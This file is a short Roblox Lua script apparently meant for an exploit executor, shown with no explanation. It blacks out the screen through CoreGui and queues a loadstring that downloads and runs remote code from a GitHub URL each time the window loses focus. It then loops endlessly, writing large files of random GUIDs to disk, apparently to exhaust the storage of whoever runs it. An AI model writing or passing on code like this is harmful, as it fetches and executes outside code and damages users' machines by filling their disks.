task.wait(5)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")

queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)

ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.CoreGui
ScreenGui.DisplayOrder = 999

Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Parent = ScreenGui

ImageLabel.Image = [[http://www.roblox.com/asset/?id=12345684551]]
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BorderColor3 = Color3.new(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel.Size = UDim2.new(0.0807754472, 0, 0.179211468, 0)
ImageLabel.Parent = Frame

game:GetService("UserInputService").WindowFocusReleased:Connect(function() -- tab in
	queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
end)

UIAspectRatioConstraint.Parent = ImageLabel
while task.wait() do
	local t = ''
	for i = 1,100 do
		for i = 1,1000 do
			t..=game:GetService("HttpService"):GenerateGUID(false)
		end
		task.wait()
	end
	writefile(game:GetService("HttpService"):GenerateGUID(false),t)
end
